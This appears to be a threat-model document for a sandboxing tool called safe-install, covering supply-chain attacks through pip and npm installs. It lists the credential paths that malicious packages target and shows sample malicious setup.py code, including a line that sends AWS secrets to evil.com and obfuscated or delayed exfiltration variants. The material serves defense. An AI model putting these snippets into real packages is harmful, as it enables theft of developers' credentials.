# Threat Model

## Attack Surface: Package Installation

When you run `pip install X`, the following happens:

1. pip resolves the dependency tree (X + all transitive deps)
2. For each package, pip downloads from PyPI
3. If the package is a source distribution (sdist), pip runs `setup.py` or the build backend
4. The build script has **full access** to your user account

### What a malicious setup.py can access

| Asset | Path/Method | Impact |
|-------|------------|--------|
| SSH keys | `~/.ssh/id_*` | Access to all servers, GitHub, GitLab |
| AWS credentials | `~/.aws/credentials`, `AWS_SECRET_ACCESS_KEY` | Full cloud account access |
| GCP credentials | `~/.config/gcloud/`, `GOOGLE_APPLICATION_CREDENTIALS` | Full cloud account access |
| Azure credentials | `~/.azure/`, `AZURE_CLIENT_SECRET` | Full cloud account access |
| Kubernetes config | `~/.kube/config` | Cluster admin access |
| Git credentials | `~/.git-credentials`, `GITHUB_TOKEN` | Push to any repo |
| Browser passwords | Chrome Login Data, Firefox profiles | All saved passwords |
| API keys | `os.environ` (all env vars) | OpenAI, Stripe, Slack, etc. |
| Shell history | `~/.bash_history`, `~/.zsh_history` | Commands, passwords in cleartext |
| Crypto wallets | `~/.bitcoin/`, `~/.ethereum/`, `~/.solana/` | Direct theft |
| Docker auth | `~/.docker/config.json` | Push to registries |
| PyPI/npm tokens | `~/.pypirc`, `~/.npmrc` | Publish malicious packages (contagion) |
| SSL certificates | `*.pem`, `*.key` | Man-in-the-middle attacks |
| Database passwords | `DATABASE_URL`, `DB_PASSWORD` | Full database access |
| CI/CD tokens | `CIRCLE_TOKEN`, `CI_JOB_TOKEN` | Pipeline compromise |

### Attack timing

```
pip install pkg
       |
       v
  Resolve deps -----> Dependency confusion attack
       |               (private package name hijacked on public PyPI)
       v
  Download ---------> Package tampering
       |               (compromised maintainer, stolen credentials)
       v
  Build (setup.py) -> CODE EXECUTION (this is where exfiltration happens)
       |
       v
  Install to site-packages
       |
       v
  import pkg -------> SECOND CODE EXECUTION (init functions, import hooks)
```

## Real-World Attacks

### pip ecosystem

| Attack | Year | Impact | Method |
|--------|------|--------|--------|
| **litellm 1.82.8** | 2025 | 97M downloads/month, exfiltrated SSH keys, cloud creds, crypto wallets, shell history | Compromised maintainer credentials, malicious setup.py |
| **ultralytics** | 2024 | Cryptominer injected via compromised GitHub Actions | CI/CD pipeline compromise |
| **pytorch-nightly** | 2022 | Dependency confusion attack on `torchtriton` | Private package name registered on PyPI |
| **ctx** | 2022 | Stole env vars, sent to attacker server | Maintainer account takeover |
| **colourama** | 2023 | Typosquat of `colorama`, credential theft | Name similarity |

### npm ecosystem

| Attack | Year | Impact | Method |
|--------|------|--------|--------|
| **event-stream** | 2018 | Backdoor targeting Copay Bitcoin wallet | Social engineering (new maintainer gained trust, then injected payload) |
| **ua-parser-js** | 2021 | Cryptominer + password stealer, 7M weekly downloads | Compromised maintainer NPM account |
| **colors / faker** | 2022 | Infinite loop, broke thousands of projects | Maintainer protest/sabotage |
| **node-ipc** | 2022 | Wiped files on Russian/Belarusian IPs | Maintainer protestware |
| **@solana/web3.js** | 2024 | Credential stealer in official Solana SDK | Compromised publish access |

### Other ecosystems

| Attack | Ecosystem | Year | Method |
|--------|-----------|------|--------|
| **rustdecimal** | Cargo | 2022 | Typosquat, stole env vars via build.rs |
| **rest-client** | Gem | 2019 | Backdoor via compromised maintainer account |
| **Codecov** | Docker/CI | 2021 | Modified bash uploader script, stole CI credentials |

## Contagion Effect

The most terrifying aspect: **the attack spreads through dependency trees**.

```
Attacker compromises litellm (97M downloads/month)
    |
    +--> dspy depends on litellm >= 1.64.0
    |       +--> pip install dspy pulls in poisoned litellm
    |
    +--> any-mcp-plugin depends on litellm
    |       +--> Cursor/VSCode users get pwned
    |
    +--> company-internal-tool depends on litellm
            +--> entire engineering org compromised
            +--> stolen credentials used to:
                    +--> push malicious code to company repos
                    +--> access cloud infrastructure
                    +--> compromise more packages
                    +--> lateral movement across organization
```

Stolen PyPI/npm tokens enable the attacker to compromise MORE packages, creating a cascading chain reaction.

## Attack Sophistication Levels

### Level 1: Obvious (caught by source inspection)
```python
# setup.py
import os, urllib.request
data = os.environ.get('AWS_SECRET_ACCESS_KEY')
urllib.request.urlopen(f'https://evil.com/steal?d={data}')
```

### Level 2: Slightly obfuscated (sometimes caught)
```python
# setup.py
import base64, importlib
mod = importlib.import_module(base64.b64decode('dXJsbGli').decode())
getattr(mod, base64.b64decode('cmVxdWVzdA==').decode()).urlopen(...)
```

### Level 3: Heavily obfuscated (unlikely caught by inspection)
```python
# setup.py
exec(bytes([105,109,112,111,114,116,32,111,115]).decode())
```

### Level 4: Time-delayed / conditional (not caught by inspection)
```python
# __init__.py (runs on import, not install)
import threading, time
def _phone_home():
    time.sleep(3600)  # wait 1 hour
    # ... exfiltrate
threading.Thread(target=_phone_home, daemon=True).start()
```

### Level 5: Native code (not inspectable)
```c
// Compiled into the .so/.dll that's included in the wheel
// Binary analysis required to detect
```

**safe-install's Docker sandbox stops ALL 5 levels** because the malicious code has nothing to access, regardless of how sophisticated it is.

## Threat Matrix vs. Defense Layers

| Attack | Docker Sandbox | Binary-Only | Hash Lock | Vault | Source Scan | Net Monitor |
|--------|:---:|:---:|:---:|:---:|:---:|:---:|
| Credential theft in setup.py | BLOCKED | BLOCKED | - | BLOCKED | DETECTED | DETECTED |
| Credential theft in __init__.py | - | - | - | - | DETECTED | DETECTED |
| Dependency confusion | - | - | BLOCKED | - | - | - |
| Typosquatting | - | - | BLOCKED | - | DETECTED | - |
| Compromised maintainer | BLOCKED | BLOCKED* | BLOCKED | BLOCKED | MAYBE | DETECTED |
| Cryptominer in install | BLOCKED | BLOCKED | - | - | DETECTED | DETECTED |
| RAM bomb / DoS | BLOCKED (--memory=2g) | - | - | - | - | - |
| DNS exfiltration | PARTIAL (--dns restricted) | - | - | - | DETECTED | - |
| Time-delayed payload | - | - | - | - | - | DETECTED |
| Compiled malicious code | BLOCKED | - | BLOCKED | BLOCKED | - | DETECTED |

`*` Binary-only blocks setup.py execution but the wheel itself could still contain malicious __init__.py

## Residual Risks

Even with all defenses active, these risks remain:

1. **Import-time execution**: Code runs when you `import pkg` in your real environment
2. **Compiled binaries in wheels**: Native code can do anything
3. **Build tool compromise**: If pip/npm/cargo themselves are compromised
4. **OS-level attacks**: Kernel exploits from within Docker container (extremely unlikely with --cap-drop=ALL)
5. **Registry infrastructure**: If PyPI/npm registry itself is compromised

## Recommendations

1. **Install Docker** — it's the only flawless defense layer
2. **Use lockfiles with hashes** — detect any package tampering
3. **Prefer binary-only installs** — no code executes during install
4. **Minimize dependencies** — fewer deps = smaller attack surface
5. **Use virtual environments** — limit blast radius of import-time attacks
6. **Audit before install** — `safe-install audit pkg` before `safe-install install pkg`
7. **Pin exact versions** — prevent silent upgrades to compromised versions
8. **Monitor for credential leaks** — rotate keys if any install seems suspicious
